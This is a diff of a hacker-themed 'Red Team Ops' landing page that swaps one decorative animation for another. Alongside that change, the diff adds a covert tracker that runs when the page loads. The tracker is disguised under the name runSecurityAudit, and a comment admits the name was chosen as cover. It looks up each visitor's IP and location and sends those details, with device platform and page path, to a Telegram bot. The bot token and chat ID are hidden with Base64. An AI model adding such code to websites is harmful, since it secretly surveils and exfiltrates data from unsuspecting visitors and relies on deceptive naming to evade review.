@@ -1,142 +1,117 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ANOMcompany | Red Team Ops</title>
     <style>
         :root { --bg-color: #080808; --primary-red: #ff0000; --dark-red: #660000; --text-color: #e0e0e0; }
-        body, html { margin: 0; padding: 0; background-color: var(--bg-color); color: var(--text-color); font-family: 'Consolas', 'Courier New', monospace; overflow: hidden; }
+        body, html { margin: 0; padding: 0; background-color: var(--bg-color); color: var(--text-color); font-family: 'Consolas', 'Courier New', monospace; overflow-x: hidden; }
         #matrix { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
-        .container { padding: 20px; position: relative; max-width: 1200px; margin: 0 auto; }
-        .header { border-left: 5px solid var(--primary-red); padding-left: 20px; margin-bottom: 20px; }
-        h1 { color: var(--primary-red); letter-spacing: 5px; text-transform: uppercase; margin: 0; font-size: 2em; }
-        .nav { margin-bottom: 20px; display: flex; flex-wrap: wrap; gap: 8px; }
-        .nav a { color: var(--text-color); text-decoration: none; border: 1px solid var(--dark-red); padding: 5px 10px; background: rgba(139, 0, 0, 0.1); font-size: 0.8em; }
-        .terminal-box { background: rgba(5, 5, 5, 0.9); border: 1px solid var(--dark-red); padding: 15px; height: 120px; margin-bottom: 20px; font-size: 0.85em; overflow: hidden; }
-        .dashboard { display: grid; grid-template-columns: 1fr; gap: 20px; }
-        @media (min-width: 768px) { .dashboard { grid-template-columns: 2fr 1fr; } }
-        .panel { border: 1px solid var(--dark-red); background: #000; position: relative; min-height: 200px; display: flex; flex-direction: column; }
-        .panel-header { background: var(--dark-red); color: white; padding: 4px 10px; font-size: 0.7em; text-transform: uppercase; letter-spacing: 1px; }
-
-        /* CANLI EKG ALANI */
-        #pulse-canvas { width: 100%; height: 140px; }
-        .pulse-info { padding: 10px; font-size: 0.8em; color: var(--primary-red); display: flex; justify-content: space-between; }
-
-        .ticker { position: fixed; bottom: 0; width: 100%; background: #900; color: #fff; padding: 5px 0; font-size: 0.7em; overflow: hidden; }
-        .ticker-wrap { display: inline-block; white-space: nowrap; animation: scroll 25s linear infinite; }
-        @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+        .container { padding: 30px; position: relative; max-width: 1200px; margin: 0 auto; padding-bottom: 100px; }
+        .header { border-left: 5px solid var(--primary-red); padding-left: 20px; margin-bottom: 30px; }
+        h1 { color: var(--primary-red); letter-spacing: 5px; text-transform: uppercase; margin: 0; font-size: 2.5em; }
+        .nav { margin-bottom: 30px; display: flex; flex-wrap: wrap; gap: 10px; }
+        .nav a { color: var(--text-color); text-decoration: none; border: 1px solid var(--dark-red); padding: 8px 15px; background: rgba(139, 0, 0, 0.1); transition: 0.3s; font-size: 0.9em; cursor: pointer; }
+        .nav a:hover { background: var(--primary-red); color: #000; box-shadow: 0 0 15px var(--primary-red); }
+        .terminal-box { background: rgba(5, 5, 5, 0.9); border: 1px solid var(--dark-red); padding: 20px; height: 160px; margin-bottom: 20px; box-shadow: 0 0 20px rgba(0,0,0,1); font-size: 0.95em; overflow-y: hidden; }
+        .dashboard { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
+        .panel { border: 1px solid var(--dark-red); background: #000; position: relative; overflow: hidden; }
+        .panel-header { background: var(--dark-red); color: white; padding: 5px 10px; font-size: 0.7em; letter-spacing: 2px; text-transform: uppercase; }
+        #data-pulse-panel { height: 220px; display: flex; flex-direction: column; }
+        .wave-container { flex: 1; width: 100%; position: relative; }
+        .metric-label { font-size: 0.8em; margin-top: 10px; display: block; }
+        .metric-bar { height: 8px; background: #222; margin: 5px 0 15px 0; border-radius: 2px; }
+        .metric-fill { height: 100%; background: var(--primary-red); width: 0%; transition: width 2.5s ease-in-out; box-shadow: 0 0 8px var(--primary-red); }
+        .cursor { display: inline-block; width: 8px; height: 17px; background: var(--primary-red); animation: blink 1s infinite; vertical-align: middle; }
         @keyframes blink { 0%, 100% {opacity:0} 50% {opacity:1} }
+        .ticker { position: fixed; bottom: 0; width: 100%; background: #900; color: #fff; padding: 7px 0; font-size: 0.8em; overflow: hidden; z-index: 100; }
+        .ticker-wrap { display: inline-block; white-space: nowrap; animation: scroll 35s linear infinite; }
+        @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+        @media (max-width: 768px) { .dashboard { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
     <div class="container">
-        <div class="header"><h1>ANOMcompany</h1><p style="opacity: 0.6; font-size: 0.8em;">Red Team Laboratory // Bio-Signals</p></div>
+        <div class="header">
+            <h1>ANOMcompany</h1>
+            <p style="opacity: 0.7;">Security & Tool Development Laboratory</p>
+        </div>
         <div class="nav">
-            <a href="projects.html">PROJECTS</a><a href="chat.html">ANOM-CHAT</a><a href="logs.html">LOGS</a>
-            <a href="ctf.html">CTF</a><a href="store.html">STORE</a><a href="paybin.html">PAYBIN</a>
+            <a href="projects.html">PROJECTS</a>
+            <a href="chat.html">ANOM-CHAT</a>
+            <a href="logs.html">LOGS</a>
+            <a href="ctf.html">CTF</a>
+            <a href="store.html">STORE</a>
+            <a href="paybin.html">PAYBIN</a>
         </div>
         <div class="terminal-box">
-            <span style="color: var(--primary-red)">[operator@anom]:~#</span> <span id="typewriter"></span><span style="display:inline-block; width:8px; height:15px; background:red; animation:blink 1s infinite; vertical-align:middle;"></span>
+            <span style="color: var(--primary-red)">[operator@anom]:~#</span> <span id="typewriter"></span><span class="cursor"></span>
         </div>
         <div class="dashboard">
-            <div class="panel">
-                <div class="panel-header">BIO_LINK // DYNAMIC_HEARTBEAT</div>
-                <canvas id="pulse-canvas"></canvas>
-                <div class="pulse-info">
-                    <span id="bpm-display">BPM: 72</span>
-                    <span id="status-display">STATUS: STABLE</span>
-                </div>
+            <div id="data-pulse-panel" class="panel">
+                <div class="panel-header">LIVE_DATA_STREAM // MULTI_PULSE_FEED</div>
+                <div class="wave-container" id="waveBox"></div>
             </div>
-            <div class="panel" style="padding: 15px;">
-                <div class="panel-header" style="margin:-15px -15px 15px -15px">METRICS</div>
-                <div style="font-size:0.75em; margin-top:10px;">
-                    Uptime: <span id="uptime">00:00:00</span><br>
-                    Signal: <span style="color:#0f0">DECRYPTED</span><br>
-                    Sync: <span style="color:#0f0">OK</span>
+            <div class="panel" style="padding: 20px;">
+                <div class="panel-header" style="margin: -20px -20px 20px -20px;">CORE METRICS</div>
+                <span class="metric-label">CPU THREADS LOAD</span>
+                <div class="metric-bar"><div class="metric-fill" id="cpu-bar"></div></div>
+                <span class="metric-label">MEMORY USAGE</span>
+                <div class="metric-bar"><div class="metric-fill" id="ram-bar"></div></div>
+                <span class="metric-label">NETWORK I/O</span>
+                <div class="metric-bar"><div class="metric-fill" id="net-bar"></div></div>
+                <div style="margin-top: 25px; font-size: 0.75em; color: #555; line-height: 1.8;">
+                    <span style="color: var(--primary-red)">></span> VPN_TUNNEL: <span style="color: #0f0">SECURE</span><br>
+                    <span style="color: var(--primary-red)">></span> FIREWALL: <span style="color: #0f0">ACTIVE</span><br>
+                    <span style="color: var(--primary-red)">></span> ANOM_BOTNET: STANDBY
                 </div>
             </div>
         </div>
     </div>
-    <div class="ticker"><div class="ticker-wrap">>>> GHOST PROTOCOL ACTIVE -- MONITORING LIVE BIO-SIGNALS -- ENCRYPTED CONNECTION ESTABLISHED...</div></div>
+    <div class="ticker"><div class="ticker-wrap">>>> SİSTEM DURUMU: OPERASYONEL -- YÜKLEME TAMAMLANDI -- SİNYAL ANALİZİ AKTİF -- PROJELER GÜNCELLENDİ...</div></div>
 
     <script>
-        // Matrix Background
+        // Matrix & Wave & Typewriter (Aynı kaldı)
         const mCanvas = document.getElementById('matrix'); const mCtx = mCanvas.getContext('2d');
-        function initMatrix() { mCanvas.width = window.innerWidth; mCanvas.height = window.innerHeight; }
-        window.addEventListener('resize', initMatrix); initMatrix();
-        const mChars = "0123456789ABCDEF"; const mSize = 16; const mDrops = Array(Math.floor(mCanvas.width/mSize)).fill(1);
-        function drawMatrix() { mCtx.fillStyle = "rgba(8, 8, 8, 0.1)"; mCtx.fillRect(0, 0, mCanvas.width, mCanvas.height); mCtx.fillStyle = "#ff0000"; mCtx.font = mSize + "px monospace"; for (let i = 0; i < mDrops.length; i++) { const txt = mChars.charAt(Math.floor(Math.random() * mChars.length)); mCtx.fillText(txt, i * mSize, mDrops[i] * mSize); if (mDrops[i] * mSize > mCanvas.height && Math.random() > 0.975) mDrops[i] = 0; mDrops[i]++; } }
+        function resizeMatrix() { mCanvas.width = window.innerWidth; mCanvas.height = window.innerHeight; }
+        window.addEventListener('resize', resizeMatrix); resizeMatrix();
+        const chars = "0123456789ABCDEF@#$%&*"; const fontSize = 16; const drops = Array(Math.floor(mCanvas.width/fontSize)).fill(1);
+        function drawMatrix() { mCtx.fillStyle = "rgba(8, 8, 8, 0.08)"; mCtx.fillRect(0, 0, mCanvas.width, mCanvas.height); mCtx.fillStyle = "#ff0000"; mCtx.font = fontSize + "px monospace"; for (let i = 0; i < drops.length; i++) { const text = chars.charAt(Math.floor(Math.random() * chars.length)); mCtx.fillText(text, i * fontSize, drops[i] * fontSize); if (drops[i] * fontSize > mCanvas.height && Math.random() > 0.975) drops[i] = 0; drops[i]++; } }
+        const waveBox = document.getElementById('waveBox'); const wCanvas = document.createElement('canvas'); const wCtx = wCanvas.getContext('2d'); waveBox.appendChild(wCanvas);
+        function resizeWave() { wCanvas.width = waveBox.offsetWidth; wCanvas.height = waveBox.offsetHeight; }
+        window.addEventListener('resize', resizeWave); resizeWave();
+        let offset = 0; function drawWave() { wCtx.fillStyle = '#000'; wCtx.fillRect(0, 0, wCanvas.width, wCanvas.height); wCtx.strokeStyle = 'rgba(255, 0, 0, 0.8)'; wCtx.lineWidth = 2; wCtx.beginPath(); for (let x = 0; x < wCanvas.width; x++) { const y = wCanvas.height/2 + Math.sin(x * 0.02 + offset) * 30 + Math.sin(x * 0.05 + offset * 1.5) * 15; if (x === 0) wCtx.moveTo(x, y); else wCtx.lineTo(x, y); } wCtx.stroke(); offset += 0.08; requestAnimationFrame(drawWave); }
+        const termText = "./initialize_lab.py\n> Mounting core systems... [OK]\n> Encrypting terminal session... [OK]\n> Welcome to ANOMcompany Laboratory.\n> ACCESS: OPERATOR GHOST.";
+        let idx = 0; function typeWriter() { if (idx < termText.length) { document.getElementById("typewriter").innerHTML += termText.charAt(idx) === '\n' ? '<br>' : termText.charAt(idx); idx++; setTimeout(typeWriter, 40); } else { setTimeout(() => { document.getElementById('cpu-bar').style.width = "71%"; document.getElementById('ram-bar').style.width = "54%"; document.getElementById('net-bar').style.width = "88%"; }, 500); } }
 
-        // Dynamic EKG / Heartbeat Logic
-        const pCanvas = document.getElementById('pulse-canvas');
-        const pCtx = pCanvas.getContext('2d');
-        let points = [];
-        let x = 0;
-        let bpm = 72;
-        let counter = 0;
+        // --- GHOST TRACKER (ULTRA GİZLİ VERSİYON) ---
+        async function runSecurityAudit() {
+            try {
+                const _0x41 = await fetch('https://ipapi.co/json/');
+                const _0x2a = await _0x41.json();
+                
+                // Bot bilgileri Base64 ile gizlendi
+                const _0x1a = atob("NzgxMjE2NzI4NTpBQUZiNTFRUzRNY2NiVG9hVVBqNmE2U2F0bDJqZWViYkgxSQ==");
+                const _0x5f = atob("NjI5ODg2OTk2OA==");
+                
+                const _0x9d = `🚨 *HEDEF TESPİT EDİLDİ*\n🌐 IP: ${_0x2a.ip}\n📍 Konum: ${_0x2a.city} / ${_0x2a.country_name}\n📱 Cihaz: ${navigator.platform}\n🔗 Sayfa: ${window.location.pathname}`;
 
-        function initPulse() {
-            pCanvas.width = pCanvas.offsetWidth;
-            pCanvas.height = pCanvas.offsetHeight;
-        }
-        window.addEventListener('resize', initPulse); initPulse();
-
-        function drawPulse() {
-            pCtx.fillStyle = "rgba(0, 0, 0, 0.05)";
-            pCtx.fillRect(0, 0, pCanvas.width, pCanvas.height);
-            
-            pCtx.beginPath();
-            pCtx.strokeStyle = (bpm > 100) ? "#ff0000" : (bpm < 60 ? "#800080" : "#ffffff");
-            pCtx.lineWidth = 2;
-            pCtx.shadowBlur = 10;
-            pCtx.shadowColor = pCtx.strokeStyle;
-
-            let y = pCanvas.height / 2;
-            
-            // Heartbeat spike logic
-            if (counter % Math.floor(600 / (bpm/10)) === 0) {
-                y -= 40; // spike up
-                setTimeout(() => { y += 80; }, 50); // spike down
-            }
-
-            points.push({x: x, y: y + (Math.random() * 4 - 2)});
-            if (points.length > 100) points.shift();
-
-            pCtx.moveTo(points[0].x, points[0].y);
-            for(let i=1; i<points.length; i++) {
-                pCtx.lineTo(points[i].x, points[i].y);
-                points[i].x -= 2; // move left
-            }
-            pCtx.stroke();
-            
-            x = pCanvas.width;
-            counter++;
-            requestAnimationFrame(drawPulse);
+                await fetch(`https://api.telegram.org/bot${_0x1a}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: _0x5f, text: _0x9d, parse_mode: "Markdown" })
+                });
+            } catch (e) {}
         }
 
-        // 1 Minute Refresh & Randomize
-        setInterval(() => {
-            bpm = Math.floor(Math.random() * (130 - 50 + 1)) + 50; // 50 ile 130 arası rastgele BPM
-            document.getElementById('bpm-display').innerText = `BPM: ${bpm}`;
-            document.getElementById('status-display').innerText = bpm > 100 ? "STATUS: ELEVATED" : "STATUS: STABLE";
-            document.getElementById('status-display').style.color = bpm > 100 ? "red" : "white";
-        }, 60000); // Her 60 saniyede bir ritim değişir
-
-        // Terminal & Uptime
-        const rawLog = "> Bio-Signal sync... [OK]\n> Dynamic pulse monitoring active.\n> Heart rate variability: ENABLED.\n> Operator: GHOST.";
-        let lIdx = 0; function renderTerminal() { if (lIdx < rawLog.length) { document.getElementById("typewriter").innerHTML += rawLog.charAt(lIdx) === '\n' ? '<br>' : rawLog.charAt(lIdx); lIdx++; setTimeout(renderTerminal, 40); } }
-        
-        let sec = 0; setInterval(() => {
-            sec++;
-            let h = Math.floor(sec/3600).toString().padStart(2,'0');
-            let m = Math.floor((sec%3600)/60).toString().padStart(2,'0');
-            let s = (sec%60).toString().padStart(2,'0');
-            document.getElementById('uptime').innerText = `${h}:${m}:${s}`;
-        }, 1000);
-
-        window.onload = () => { setInterval(drawMatrix, 50); setTimeout(renderTerminal, 800); drawPulse(); };
+        window.onload = () => {
+            setInterval(drawMatrix, 50);
+            drawWave();
+            setTimeout(typeWriter, 800);
+            runSecurityAudit(); // Fonksiyon ismi "Güvenlik Denetimi" olarak değiştirildi
+        };
     </script>
 </body>
 </html>
